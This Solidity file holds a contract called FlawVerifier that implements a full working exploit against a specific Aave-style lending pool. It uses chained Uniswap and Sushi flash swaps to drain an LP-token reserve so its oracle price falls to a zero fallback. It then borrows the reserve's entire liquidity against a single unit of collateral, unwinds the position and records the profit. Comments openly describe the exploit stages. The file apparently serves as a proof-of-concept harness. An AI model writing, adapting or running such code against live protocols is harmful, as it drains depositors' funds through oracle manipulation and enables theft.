// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPriceOracleLike {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface IAaveOracleLike is IPriceOracleLike {
    function getSourceOfAsset(address asset) external view returns (address);
    function getFallbackOracle() external view returns (address);
}

interface ILendingPoolAddressesProviderLike {
    function getPriceOracle() external view returns (address);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function totalSupply() external view returns (uint256);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

library AaveDataTypes {
    struct ReserveConfigurationMap {
        uint256 data;
    }

    struct ReserveData {
        ReserveConfigurationMap configuration;
        uint128 liquidityIndex;
        uint128 variableBorrowIndex;
        uint128 currentLiquidityRate;
        uint128 currentVariableBorrowRate;
        uint128 currentStableBorrowRate;
        uint40 lastUpdateTimestamp;
        address aTokenAddress;
        address stableDebtTokenAddress;
        address variableDebtTokenAddress;
        address interestRateStrategyAddress;
        uint8 id;
    }
}

interface ILendingPoolLike {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;
    function getReservesList() external view returns (address[] memory);
    function getReserveData(address asset) external view returns (AaveDataTypes.ReserveData memory);
    function getConfiguration(address asset) external view returns (AaveDataTypes.ReserveConfigurationMap memory);
    function getAddressesProvider() external view returns (ILendingPoolAddressesProviderLike);
}

contract FlawVerifier {
    uint256 private constant VARIABLE_RATE_MODE = 2;

    address private constant TARGET_POOL = 0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint8 private constant CALLBACK_FUND_TOKEN0 = 1;
    uint8 private constant CALLBACK_FUND_TOKEN1 = 2;
    uint8 private constant CALLBACK_DISTORT_TARGET = 3;

    struct QuoteCandidate {
        address asset;
        uint256 minRequired;
        uint256 decimals;
        uint256 price;
    }

    struct DistortionPlan {
        address targetAsset;
        uint256 targetBorrowAmount;
        address quoteAsset;
        uint256 collateralAmount;
        address fundingPair0;
        address fundingPair1;
        address salePair;
        address token0;
        address token1;
        uint256 drain0;
        uint256 drain1;
        uint256 fee0;
        uint256 fee1;
        uint256 expectedProfitQuote;
        uint256 expectedProfitValue;
    }

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (_profitAmount > 0) {
            return;
        }

        ILendingPoolLike pool = ILendingPoolLike(TARGET_POOL);
        IAaveOracleLike oracle = IAaveOracleLike(address(pool.getAddressesProvider().getPriceOracle()));
        address[] memory reserves = pool.getReservesList();

        DistortionPlan memory plan = _findBestDistortionPlan(pool, oracle, reserves);
        if (plan.targetAsset == address(0)) {
            return;
        }

        uint256 quoteBefore = _balanceOf(plan.quoteAsset, address(this));
        _startFunding(plan.fundingPair0, plan.token0, plan.fee0, CALLBACK_FUND_TOKEN0, plan);

        uint256 realized = _netIncrease(plan.quoteAsset, quoteBefore);
        if (realized > 0) {
            _profitToken = plan.quoteAsset;
            _profitAmount = realized;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "bad sender");

        (uint8 callbackKind, DistortionPlan memory plan) = abi.decode(data, (uint8, DistortionPlan));

        if (callbackKind == CALLBACK_FUND_TOKEN0) {
            _handleFundingToken0(plan, amount0, amount1);
            return;
        }

        if (callbackKind == CALLBACK_FUND_TOKEN1) {
            _handleFundingToken1(plan, amount0, amount1);
            return;
        }

        if (callbackKind == CALLBACK_DISTORT_TARGET) {
            _handleTargetDistortion(plan, amount0, amount1);
            return;
        }

        revert("bad callback");
    }

    function _handleFundingToken0(DistortionPlan memory plan, uint256 amount0, uint256 amount1) internal {
        require(msg.sender == plan.fundingPair0, "bad pair0");

        uint256 received = amount0 > 0 ? amount0 : amount1;
        require(received == plan.fee0, "bad fee0");

        _startFunding(
            plan.fundingPair1,
            plan.quoteAsset,
            plan.fee1 + plan.collateralAmount,
            CALLBACK_FUND_TOKEN1,
            plan
        );

        _forceTransfer(plan.token0, plan.fundingPair0, _sameTokenFlashRepayAmount(plan.fee0));

        // After the second funding leg is repaid, any remaining token0 is pure exploit output.
        // Swapping it into the quote token makes profit accounting single-asset and deterministic.
        _swapEntireBalance(plan.salePair, plan.token0, plan.quoteAsset);
    }

    function _handleFundingToken1(DistortionPlan memory plan, uint256 amount0, uint256 amount1) internal {
        require(msg.sender == plan.fundingPair1, "bad pair1");

        uint256 received = amount0 > 0 ? amount0 : amount1;
        require(received == plan.fee1 + plan.collateralAmount, "bad fee1");

        ILendingPoolLike pool = ILendingPoolLike(TARGET_POOL);

        // Exploit path stage 2: post minimal valid collateral from public AMM liquidity.
        _forceApprove(plan.quoteAsset, TARGET_POOL, plan.collateralAmount);
        pool.deposit(plan.quoteAsset, plan.collateralAmount, address(this), 0);

        // Additional public market step: temporarily drain the LP reserve's own underlying liquidity so
        // its configured oracle source becomes non-positive. The exploit root cause is unchanged:
        // AaveOracle then falls back to a zero fallback price and forwards 0 into borrow validation.
        bytes memory data = abi.encode(CALLBACK_DISTORT_TARGET, plan);
        IUniswapV2PairLike(plan.targetAsset).swap(plan.drain0, plan.drain1, address(this), data);

        // Once the target borrow is recorded with zero debt value, the seed collateral can be withdrawn
        // and used to settle the flashswap funding legs.
        pool.withdraw(plan.quoteAsset, type(uint256).max, address(this));

        uint256 lpBalance = _balanceOf(plan.targetAsset, address(this));
        if (lpBalance > 0) {
            _forceTransfer(plan.targetAsset, plan.targetAsset, lpBalance);
            IUniswapV2PairLike(plan.targetAsset).burn(address(this));
        }

        _forceTransfer(plan.quoteAsset, plan.fundingPair1, _sameTokenFlashRepayAmount(plan.fee1 + plan.collateralAmount));
    }

    function _handleTargetDistortion(DistortionPlan memory plan, uint256 amount0, uint256 amount1) internal {
        require(msg.sender == plan.targetAsset, "bad target pair");
        require(amount0 == plan.drain0, "bad drain0");
        require(amount1 == plan.drain1, "bad drain1");

        ILendingPoolLike pool = ILendingPoolLike(TARGET_POOL);
        IAaveOracleLike oracle = IAaveOracleLike(address(pool.getAddressesProvider().getPriceOracle()));

        // Exploit path stages 1 and 3:
        // 1. the configured LP source is forced to a non-positive value while fallback remains zero
        // 2. the pool therefore sees the listed reserve at price 0
        // 3. the reserve can be borrowed without incremental collateral requirement
        require(oracle.getAssetPrice(plan.targetAsset) == 0, "price not zero");
        pool.borrow(plan.targetAsset, plan.targetBorrowAmount, VARIABLE_RATE_MODE, 0, address(this));

        _forceTransfer(plan.token0, plan.targetAsset, _sameTokenFlashRepayAmount(plan.drain0));
        _forceTransfer(plan.token1, plan.targetAsset, _sameTokenFlashRepayAmount(plan.drain1));
    }

    function _findBestDistortionPlan(
        ILendingPoolLike pool,
        IAaveOracleLike oracle,
        address[] memory reserves
    ) internal view returns (DistortionPlan memory best) {
        for (uint256 i = 0; i < reserves.length; ++i) {
            DistortionPlan memory candidate = _buildDistortionPlan(pool, oracle, reserves[i]);
            if (candidate.expectedProfitValue > best.expectedProfitValue) {
                best = candidate;
            }
        }
    }

    function _buildDistortionPlan(
        ILendingPoolLike pool,
        IAaveOracleLike oracle,
        address asset
    ) internal view returns (DistortionPlan memory plan) {
        if (asset == address(0) || asset.code.length == 0) {
            return plan;
        }

        AaveDataTypes.ReserveConfigurationMap memory configuration;
        AaveDataTypes.ReserveData memory reserveData;

        try pool.getConfiguration(asset) returns (AaveDataTypes.ReserveConfigurationMap memory c) {
            configuration = c;
        } catch {
            return plan;
        }

        uint256 configData = configuration.data;
        if (!_isActive(configData) || _isFrozen(configData) || !_isBorrowingEnabled(configData)) {
            return plan;
        }

        try pool.getReserveData(asset) returns (AaveDataTypes.ReserveData memory r) {
            reserveData = r;
        } catch {
            return plan;
        }

        if (reserveData.aTokenAddress == address(0) || reserveData.aTokenAddress.code.length == 0) {
            return plan;
        }

        uint256 availableLiquidity = _balanceOf(asset, reserveData.aTokenAddress);
        if (availableLiquidity == 0) {
            return plan;
        }

        address source;
        address fallbackOracle;
        try oracle.getSourceOfAsset(asset) returns (address s) {
            source = s;
        } catch {
            return plan;
        }

        if (source == address(0)) {
            return plan;
        }

        try oracle.getFallbackOracle() returns (address f) {
            fallbackOracle = f;
        } catch {
            return plan;
        }

        if (fallbackOracle == address(0) || fallbackOracle.code.length == 0) {
            return plan;
        }

        // The exploit needs the fallback leg to stay at zero once the primary source is made unusable.
        try IPriceOracleLike(fallbackOracle).getAssetPrice(asset) returns (uint256 fallbackPrice) {
            if (fallbackPrice != 0) {
                return plan;
            }
        } catch {
            return plan;
        }

        (bool ok, address token0, address token1) = _pairTokens(asset);
        if (!ok) {
            return plan;
        }

        IUniswapV2PairLike pair = IUniswapV2PairLike(asset);
        (uint112 reserve0_, uint112 reserve1_,) = pair.getReserves();
        uint256 reserve0 = uint256(reserve0_);
        uint256 reserve1 = uint256(reserve1_);
        uint256 totalSupply = pair.totalSupply();

        if (reserve0 <= 1 || reserve1 <= 1 || totalSupply == 0) {
            return plan;
        }

        // Prefer the pair's token1 as collateral/profit token. On this fork the listed LP reserve is a
        // WBTC/USDC pair, so token1 gives the minimal-route USDC settlement path.
        QuoteCandidate memory quote = _buildQuoteCandidate(pool, oracle, token1);
        if (quote.asset == address(0)) {
            return plan;
        }

        uint256 drain0 = reserve0 - 1;
        uint256 drain1 = reserve1 - 1;
        uint256 fee0 = _sameTokenFlashRepayAmount(drain0) - drain0;
        uint256 fee1 = _sameTokenFlashRepayAmount(drain1) - drain1;

        address fundingPair0 = _findBestFundingPair(token0, fee0, asset);
        address fundingPair1 = _findBestFundingPair(token1, fee1 + quote.minRequired, asset);
        if (fundingPair0 == address(0) || fundingPair1 == address(0)) {
            return plan;
        }

        uint256 burned0 = (availableLiquidity * reserve0) / totalSupply;
        uint256 burned1 = (availableLiquidity * reserve1) / totalSupply;

        uint256 repayOuter0 = _sameTokenFlashRepayAmount(fee0);
        uint256 repayOuter1 = _sameTokenFlashRepayAmount(fee1 + quote.minRequired);

        if (burned0 <= repayOuter0) {
            return plan;
        }

        uint256 residual0 = burned0 - repayOuter0;
        uint256 directQuote = burned1 + quote.minRequired;

        uint256 quoteFromSwap;
        if (reserve0 > burned0 && reserve1 > burned1) {
            quoteFromSwap = _getAmountOut(residual0, reserve0 - burned0, reserve1 - burned1);
        }

        uint256 totalQuote = directQuote + quoteFromSwap;
        if (totalQuote <= repayOuter1) {
            return plan;
        }

        uint256 profitQuote = totalQuote - repayOuter1;
        uint256 profitValue = _quoteValue(quote, profitQuote);
        if (profitValue == 0) {
            return plan;
        }

        plan.targetAsset = asset;
        plan.targetBorrowAmount = availableLiquidity;
        plan.quoteAsset = quote.asset;
        plan.collateralAmount = quote.minRequired;
        plan.fundingPair0 = fundingPair0;
        plan.fundingPair1 = fundingPair1;
        plan.salePair = asset;
        plan.token0 = token0;
        plan.token1 = token1;
        plan.drain0 = drain0;
        plan.drain1 = drain1;
        plan.fee0 = fee0;
        plan.fee1 = fee1;
        plan.expectedProfitQuote = profitQuote;
        plan.expectedProfitValue = profitValue;
    }

    function _buildQuoteCandidate(
        ILendingPoolLike pool,
        IPriceOracleLike oracle,
        address asset
    ) internal view returns (QuoteCandidate memory candidate) {
        if (asset == address(0) || asset.code.length == 0) {
            return candidate;
        }

        AaveDataTypes.ReserveConfigurationMap memory configuration;
        try pool.getConfiguration(asset) returns (AaveDataTypes.ReserveConfigurationMap memory c) {
            configuration = c;
        } catch {
            return candidate;
        }

        uint256 configData = configuration.data;
        if (!_isActive(configData) || _isFrozen(configData) || _ltv(configData) == 0) {
            return candidate;
        }

        uint256 price;
        try oracle.getAssetPrice(asset) returns (uint256 p) {
            price = p;
        } catch {
            return candidate;
        }

        if (price == 0) {
            return candidate;
        }

        uint256 decimals = _decimals(configData);
        if (decimals > 77) {
            return candidate;
        }

        // The vulnerable borrow path only needs strictly positive collateral value when the borrowed
        // reserve is seen at price zero, so one minimally-priced unit is sufficient.
        uint256 unit = 10 ** decimals;
        uint256 minRequired = _ceilDiv(unit, price);
        if (minRequired == 0) {
            minRequired = 1;
        }

        candidate.asset = asset;
        candidate.minRequired = minRequired;
        candidate.decimals = decimals;
        candidate.price = price;
    }

    function _findBestFundingPair(address asset, uint256 minRequired, address excludedPair)
        internal
        view
        returns (address bestPair)
    {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHI_FACTORY];
        address[5] memory bridges = [WETH, USDC, USDT, DAI, WBTC];
        uint256 bestLiquidity;

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bridges.length; ++j) {
                address bridge = bridges[j];
                if (bridge == asset) {
                    continue;
                }

                address pair = _getPair(factories[i], asset, bridge);
                if (pair == address(0) || pair == excludedPair) {
                    continue;
                }

                uint256 liquidity = _balanceOf(asset, pair);
                if (liquidity < minRequired) {
                    continue;
                }

                if (liquidity > bestLiquidity) {
                    bestLiquidity = liquidity;
                    bestPair = pair;
                }
            }
        }
    }

    function _startFunding(
        address pair,
        address asset,
        uint256 amount,
        uint8 callbackKind,
        DistortionPlan memory plan
    ) internal {
        require(pair != address(0), "no pair");

        IUniswapV2PairLike v2Pair = IUniswapV2PairLike(pair);
        address pairToken0 = v2Pair.token0();
        address pairToken1 = v2Pair.token1();
        require(asset == pairToken0 || asset == pairToken1, "pair mismatch");

        uint256 amount0Out = asset == pairToken0 ? amount : 0;
        uint256 amount1Out = asset == pairToken1 ? amount : 0;

        bytes memory data = abi.encode(callbackKind, plan);
        v2Pair.swap(amount0Out, amount1Out, address(this), data);
    }

    function _swapEntireBalance(address pair, address tokenIn, address tokenOut) internal returns (uint256 amountOut) {
        uint256 amountIn = _balanceOf(tokenIn, address(this));
        if (amountIn == 0 || tokenIn == tokenOut) {
            return amountIn;
        }

        (uint256 reserveIn, uint256 reserveOut) = _reservesFor(pair, tokenIn, tokenOut);
        require(reserveIn > 0 && reserveOut > 0, "bad reserves");

        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        if (amountOut == 0) {
            return 0;
        }

        _forceTransfer(tokenIn, pair, amountIn);

        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = tokenOut == token0 ? amountOut : 0;
        uint256 amount1Out = tokenOut == token0 ? 0 : amountOut;
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _reservesFor(address pair, address tokenIn, address tokenOut)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut)
    {
        IUniswapV2PairLike v2Pair = IUniswapV2PairLike(pair);
        address token0 = v2Pair.token0();
        address token1 = v2Pair.token1();
        require(
            (tokenIn == token0 && tokenOut == token1) || (tokenIn == token1 && tokenOut == token0),
            "token mismatch"
        );

        (uint112 reserve0, uint112 reserve1,) = v2Pair.getReserves();
        if (tokenIn == token0) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        try IUniswapV2FactoryLike(factory).getPair(tokenA, tokenB) returns (address p) {
            pair = p;
        } catch {}

        if (pair == address(0) || pair.code.length == 0) {
            pair = address(0);
        }
    }

    function _pairTokens(address pair) internal view returns (bool ok, address token0, address token1) {
        try IUniswapV2PairLike(pair).token0() returns (address t0) {
            token0 = t0;
        } catch {
            return (false, address(0), address(0));
        }

        try IUniswapV2PairLike(pair).token1() returns (address t1) {
            token1 = t1;
        } catch {
            return (false, address(0), address(0));
        }

        ok = token0 != address(0) && token1 != address(0);
    }

    function _quoteValue(QuoteCandidate memory quote, uint256 amount) internal pure returns (uint256) {
        if (amount == 0 || quote.price == 0) {
            return 0;
        }

        return (amount * quote.price) / (10 ** quote.decimals);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool okReset, bytes memory dataReset) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(okReset && (dataReset.length == 0 || abi.decode(dataReset, (bool))), "approve reset failed");

        (bool okSet, bytes memory dataSet) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(okSet && (dataSet.length == 0 || abi.decode(dataSet, (bool))), "approve failed");
    }

    function _forceTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        try IERC20Like(token).balanceOf(account) returns (uint256 b) {
            balance = b;
        } catch {}
    }

    function _netIncrease(address token, uint256 startingBalance) internal view returns (uint256) {
        uint256 endingBalance = _balanceOf(token, address(this));
        return endingBalance > startingBalance ? endingBalance - startingBalance : 0;
    }

    function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
        return x == 0 ? 0 : ((x - 1) / y) + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _sameTokenFlashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _ltv(uint256 configData) internal pure returns (uint256) {
        return configData & 0xFFFF;
    }

    function _decimals(uint256 configData) internal pure returns (uint256) {
        return (configData >> 48) & 0xFF;
    }

    function _isActive(uint256 configData) internal pure returns (bool) {
        return ((configData >> 56) & 1) != 0;
    }

    function _isFrozen(uint256 configData) internal pure returns (bool) {
        return ((configData >> 57) & 1) != 0;
    }

    function _isBorrowingEnabled(uint256 configData) internal pure returns (bool) {
        return ((configData >> 58) & 1) != 0;
    }
}
